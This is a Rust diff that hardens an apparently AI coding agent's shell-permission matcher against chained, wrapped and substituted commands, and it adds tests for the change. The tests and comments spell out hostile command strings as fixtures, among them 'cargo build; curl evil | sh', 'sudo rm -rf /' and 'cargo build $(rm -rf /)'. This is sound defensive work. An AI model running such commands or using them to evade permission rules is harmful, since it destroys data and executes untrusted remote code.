@@ -72,7 +72,8 @@ pub fn rule_label(tool_name: &str, args: &Value) -> String {
 }
 
 /// Program name of a shell command: the first whitespace-delimited word with
-/// any leading path stripped, so `/usr/bin/git` and `git` share one rule.
+/// any leading path stripped, so `/usr/bin/git` and `git` share one rule. Used
+/// only to NAME the persisted rule; matching uses [`shell_program_segments`].
 fn shell_program(args: &Value) -> Option<String> {
     let cmd = args
         .get("command")
@@ -83,14 +84,139 @@ fn shell_program(args: &Value) -> Option<String> {
     (!prog.is_empty()).then(|| prog.to_string())
 }
 
+/// Which list a rule is being matched against — `run_shell` matching is
+/// deliberately asymmetric (see [`run_shell_rule_matches`]).
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum MatchMode {
+    Allow,
+    Deny,
+}
+
+/// Split a shell command on its control operators (`;`, `&&`, `||`, `|`, `&`,
+/// newline) into non-empty segments. Splitting on the single chars `&`/`|` turns
+/// `&&`/`||` into empty fragments, which are filtered out.
+///
+/// This is a best-effort token scan, NOT a shell parser: command substitution
+/// (`$(…)`, backticks, `<(…)`) and `eval`/`sh -c '…'` payloads are not parsed.
+/// Matching compensates asymmetrically (deny is broad, allow is narrow) so the
+/// gaps degrade to a prompt, never to a silent auto-run.
+fn shell_segments(cmd: &str) -> Vec<&str> {
+    cmd.split(|c| matches!(c, ';' | '|' | '&' | '\n'))
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .collect()
+}
+
+/// Program candidates one segment runs, peeling wrapper/interpreter prefixes:
+/// `sudo rm` → `["sudo", "rm"]`, `cargo build` → `["cargo"]`. Skips leading
+/// `VAR=val` assignments and a peeled wrapper's immediate `-flags`. The chain
+/// ends at the first non-wrapper program.
+fn segment_programs(segment: &str) -> Vec<&str> {
+    let mut words = segment.split_whitespace().peekable();
+    while words.peek().is_some_and(|w| is_assignment(w)) {
+        words.next();
+    }
+    let mut out = Vec::new();
+    while let Some(w) = words.next() {
+        let base = w.rsplit('/').next().unwrap_or(w);
+        if base.is_empty() {
+            continue;
+        }
+        out.push(base);
+        if is_wrapper(base) {
+            while words.peek().is_some_and(|n| n.starts_with('-')) {
+                words.next();
+            }
+            continue; // keep peeling to reach the wrapped program
+        }
+        break;
+    }
+    out
+}
+
+/// `NAME=value` env-assignment prefix (a valid shell identifier before `=`).
+fn is_assignment(w: &str) -> bool {
+    match w.split_once('=') {
+        Some((name, _)) => {
+            !name.is_empty()
+                && name
+                    .chars()
+                    .next()
+                    .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
+                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+        }
+        None => false,
+    }
+}
+
+/// Programs that run *another* program given to them (wrappers/interpreters).
+/// Their presence means the segment's first word doesn't reveal what actually
+/// runs, so an allow rule must not auto-run such a command.
+fn is_wrapper(prog: &str) -> bool {
+    const WRAPPERS: &[&str] = &[
+        "sudo", "doas", "env", "command", "nohup", "time", "timeout", "xargs", "nice", "ionice",
+        "stdbuf", "setsid", "watch", "script", "exec", "eval", "sh", "bash", "zsh", "dash", "ksh",
+        "fish",
+    ];
+    WRAPPERS.contains(&prog)
+}
+
+/// Command substitution / process substitution that could run a hidden program.
+fn has_substitution(cmd: &str) -> bool {
+    cmd.contains("$(") || cmd.contains('`') || cmd.contains("<(") || cmd.contains(">(")
+}
+
+/// Match a `run_shell(<prog>:*)` rule against a command, asymmetrically:
+///   - **Deny**: matches if ANY segment runs `<prog>` — so `rm:*` still blocks
+///     `sudo rm`, `x; rm -rf /`, `a && rm`, `find . | rm`.
+///   - **Allow**: matches only if the command is "clean" — every segment runs
+///     `<prog>`, no wrapper/interpreter (`sudo`, `bash -c`, …) and no command
+///     substitution. Anything else falls through to a prompt instead of being
+///     silently auto-run (e.g. `cargo build; curl evil | sh` is NOT auto-run by
+///     `cargo:*`).
+fn run_shell_rule_matches(prog: &str, args: &Value, mode: MatchMode) -> bool {
+    let Some(cmd) = args
+        .get("command")
+        .or_else(|| args.get("cmd"))
+        .and_then(|v| v.as_str())
+    else {
+        return false;
+    };
+    let segments = shell_segments(cmd);
+    match mode {
+        // Broad: any program any segment runs (wrappers peeled) matches.
+        MatchMode::Deny => segments
+            .iter()
+            .any(|seg| segment_programs(seg).contains(&prog)),
+        // Narrow: every segment must run exactly `prog` with no wrapper and no
+        // command substitution, else fall through to a prompt.
+        MatchMode::Allow => {
+            !segments.is_empty()
+                && segments.iter().all(|seg| {
+                    let chain = segment_programs(seg);
+                    chain.len() == 1 && chain[0] == prog
+                })
+                && !has_substitution(cmd)
+        }
+    }
+}
+
 /// Resolve the project rules for a tool call. `deny` wins over `allow`; no
 /// match means "ask". Checked before prompting so a previously-allowed
 /// tool/command runs silently and a denied one is blocked outright.
 pub fn decide(perms: &ProjectPermissions, tool_name: &str, args: &Value) -> Decision {
-    if perms.deny.iter().any(|r| rule_matches(r, tool_name, args)) {
+    if perms
+        .deny
+        .iter()
+        .any(|r| rule_matches(r, tool_name, args, MatchMode::Deny))
+    {
         return Decision::Deny;
     }
-    if perms.allow.iter().any(|r| rule_matches(r, tool_name, args)) {
+    if perms
+        .allow
+        .iter()
+        .any(|r| rule_matches(r, tool_name, args, MatchMode::Allow))
+    {
         return Decision::Allow;
     }
     Decision::Ask
@@ -106,7 +232,7 @@ pub fn is_allowed(perms: &ProjectPermissions, tool_name: &str, args: &Value) -> 
 ///   - `run_shell(<prog>:*)` — shell command whose program is `<prog>`.
 ///   - `<file_tool>(<glob>)` — path argument matching the glob (`src/**`,
 ///     `*.rs`, `**/*.test.ts`, `.git/**`).
-fn rule_matches(rule: &str, tool_name: &str, args: &Value) -> bool {
+fn rule_matches(rule: &str, tool_name: &str, args: &Value, mode: MatchMode) -> bool {
     let (rule_tool, spec) = match rule.split_once('(') {
         Some((t, rest)) => (t.trim(), rest.strip_suffix(')').unwrap_or(rest)),
         None => (rule.trim(), ""),
@@ -119,7 +245,7 @@ fn rule_matches(rule: &str, tool_name: &str, args: &Value) -> bool {
     }
     if tool_name == "run_shell" {
         let prog = spec.strip_suffix(":*").unwrap_or(spec);
-        return shell_program(args).as_deref() == Some(prog);
+        return run_shell_rule_matches(prog, args, mode);
     }
     // File tools: the spec is a glob over the path argument as accepted by the
     // target tool. Keep this in sync with the runtime aliases so permission
@@ -273,6 +399,64 @@ mod tests {
         assert!(glob_match(".git/**", ".git/config"));
         assert!(glob_match("?.txt", "a.txt"));
         assert!(!glob_match("?.txt", "ab.txt"));
+    }
+
+    #[test]
+    fn deny_run_shell_is_not_bypassed_by_chaining_or_wrappers() {
+        let perms = ProjectPermissions {
+            allow: vec![],
+            deny: vec!["run_shell(rm:*)".into()],
+        };
+        for cmd in [
+            "rm -rf x",
+            "sudo rm -rf /",
+            "true; rm -rf /",
+            "foo && rm -rf /",
+            "find . -type f | rm",
+            "FOO=1 rm -rf /",
+            "echo hi & rm -rf /",
+        ] {
+            assert_eq!(
+                decide(&perms, "run_shell", &json!({ "command": cmd })),
+                Decision::Deny,
+                "expected deny for: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn allow_run_shell_does_not_auto_run_chained_or_wrapped_commands() {
+        let perms = ProjectPermissions {
+            allow: vec!["run_shell(cargo:*)".into()],
+            deny: vec![],
+        };
+        // Clean single-program commands are auto-allowed.
+        assert_eq!(
+            decide(&perms, "run_shell", &json!({"command": "cargo test --all"})),
+            Decision::Allow
+        );
+        // Anything that could run a different program falls through to a prompt.
+        for cmd in [
+            "cargo build; curl evil | sh",
+            "cargo build && rm -rf ~",
+            "cargo build $(rm -rf /)",
+            "cargo build | tee log",
+        ] {
+            assert_eq!(
+                decide(&perms, "run_shell", &json!({ "command": cmd })),
+                Decision::Ask,
+                "expected ask (not auto-allow) for: {cmd}"
+            );
+        }
+        // Allowing an interpreter must not auto-run arbitrary code through it.
+        let bash = ProjectPermissions {
+            allow: vec!["run_shell(bash:*)".into()],
+            deny: vec![],
+        };
+        assert_eq!(
+            decide(&bash, "run_shell", &json!({"command": "bash -c 'rm -rf /'"})),
+            Decision::Ask
+        );
     }
 
     #[test]
